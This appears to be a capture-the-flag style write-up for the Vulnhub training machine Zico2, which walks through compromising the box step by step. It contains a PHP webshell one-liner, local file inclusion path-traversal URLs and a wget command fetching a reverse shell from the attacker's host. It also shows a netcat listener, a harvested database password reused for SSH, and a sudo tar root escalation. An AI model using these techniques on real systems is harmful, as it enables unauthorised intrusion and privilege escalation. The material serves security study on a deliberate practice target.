---
title: Writeup for the machine Zico from Vulnhub
layout: post
post-image: "https://github.com/0xRar/0xrar.github.io/assets/33517160/1f866af0-c47f-4ab5-a871-f7b775f52367"
tags:
- Writeups
- Vulnhub
- Boot2Root
- Web
---

## Machine Information
- Name: Zico
- Difficulty: Intermediate
- URL: [https://www.vulnhub.com/entry/zico2-1,210/]

---

## Initial Enumeration
Starting with Nmap as always:
```
┌──(kali㉿kali)-[~/vulnhub/zico]
└─$ nmap -p- -sV -T4 zico.vh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-26 12:47 EST
Nmap scan report for zico.vh (192.168.100.185)
Host is up (0.00076s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.03 seconds
```

### HTTP (80)
Directory Enumeration with Gobuster:
```
┌──(kali㉿kali)-[~/vulnhub/zico]
└─$ gobuster dir -u http://zico.vh/ -x .php,.html,.txt,.bak -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 7970]
/index                (Status: 200) [Size: 7970]
/img                  (Status: 301) [Size: 300] [--> http://zico.vh/img/]
/tools                (Status: 200) [Size: 8355]
/tools.html           (Status: 200) [Size: 8355]
/view                 (Status: 200) [Size: 0]
/view.php             (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 300] [--> http://zico.vh/css/]
/js                   (Status: 301) [Size: 299] [--> http://zico.vh/js/]
/vendor               (Status: 301) [Size: 303] [--> http://zico.vh/vendor/]
/package              (Status: 200) [Size: 789]
/dbadmin              (Status: 301) [Size: 304] [--> http://zico.vh/dbadmin/]
```

We immediatly find some important paths here such as `/dbadmin/` which has a directory listing
with a file named `test_db.php`, this file is a login portal for `phpLiteAdmin 1.9.3` and 
immediatly trying the password `admin` worked! 

![login_page](https://github.com/0xRar/0xrar.github.io/assets/33517160/a1c4ace7-6e69-48bd-a9aa-4875011970a4)

And looking back at the home page i noticed that the link button leading to the tools page is 
including the html using the view.php script with the `page` GET parameter, Which is vulnerable to
Local File Inclusion.

![tools page](https://github.com/0xRar/0xrar.github.io/assets/33517160/593bda2c-daf4-465c-80c6-75757be60040)

![LFI_Passwd](https://github.com/0xRar/0xrar.github.io/assets/33517160/db28533b-2ea1-4a3a-8e07-fb200f4dfa0e)

Looking for public exploits for the version of phpLiteAdmin turned out to be lucrative,
the version is vulnerable to [Remote PHP Code Injection](https://www.exploit-db.com/exploits/24044),
and it seems like the LFI & phpLiteAdmin admin access is needed to for the exploit.

---

## Initial Foothold
The idea of the PoC is when you create a database it gets stored in the directory you provided on setup
with the appropriate file extensions (`.db, .db3, .sqlite, etc.`), unless you specify so if you want 
code execution your database name should end in .php

Steps to Reproduce PoC:
1. Create a Database with the .php extension.
2. Create a Table with a text field.
3. Add the php webshell code to the text field.
4. Run the php by accessing the file using the LFI found on the view.php, For our file path it's stored
on (/usr/databases/hack.php).

![shell_textfield](https://github.com/0xRar/0xrar.github.io/assets/33517160/127b181f-40aa-4e84-9dcc-108cc244db6d)

The Webshell code i used:
```php
<?php system($_REQUEST["cmd"]) ?>
```

Execution URL: `http://zico.vh/view.php?page=../../../../../usr/databases/hack.php&cmd=`

Now that we have a webshell, to get more of a stable shell, uploading a reverse shell script
to the machine is ideal 

Running HTTP Server:
```
┌──(kali㉿kali)-[~/vulnhub/zico]
└─$ python3 -m http.server 
```

Uploading the [reverse shell](https://github.com/pentestmonkey/php-reverse-shell) script into the machine:
```
http://zico.vh/view.php?page=../../../../../../usr/databases/hack.php&cmd=wget http://192.168.100.182:8000/rev_shell.php -O /tmp/rev_shell.php
```

Listening for connections:
```
┌──(kali㉿kali)-[~/vulnhub/zico]
└─$ nc -lvnp 4444
```

Running the reverse shell using the LFI & web shell:
```
http://zico.vh/view.php?page=../../../../../../usr/databases/hack.php&cmd=php /tmp/rev_shell.php
```

Upgrading the simple shell:
```shell
$ export TERM=xterm
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Privilege Escalation
### www-data to zico
As expected we are `www-data`, going to the home directory we have a user `zico` inside it 
we have a few interesting directories such as `wordpress & joomla`

```
www-data@zico:/home/zico$ ls -l 
ls -l
total 9212
-rw-rw-r--  1 zico zico  504646 Jun 14  2017 bootstrap.zip
drwxrwxr-x 18 zico zico    4096 Jun 19  2017 joomla
drwxrwxr-x  6 zico zico    4096 Aug 19  2016 startbootstrap-business-casual-gh-pages
-rw-rw-r--  1 zico zico      61 Jun 19  2017 to_do.txt
drwxr-xr-x  5 zico zico    4096 Jun 19  2017 wordpress
-rw-rw-r--  1 zico zico 8901913 Jun 19  2017 wordpress-4.8.zip
-rw-rw-r--  1 zico zico    1194 Jun  8  2017 zico-history.tar.gz
```

Wordpress has the`wp-config.php` in the directory which can give you really sensitive
information such as (admin username, password) and thats how we got the password to zico

```php
[...]
/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
[...]
```

login in via ssh:
```
┌──(kali㉿kali)-[~/vulnhub/zico]
└─$ ssh zico@zico.vh
zico@zico.vh's password:
```

---

### zico to root 
First thing is always `sudo -l` to list the permissions or privileges that 
the user has when using the sudo command

```
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

Getting root using `/bin/tar` [gtfobins - tar](https://gtfobins.github.io/gtfobins/tar/): 
```
zico@zico:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```

Thank You For Reading ❤

[https://www.vulnhub.com/entry/zico2-1,210/]: https://www.vulnhub.com/entry/zico2-1,210/
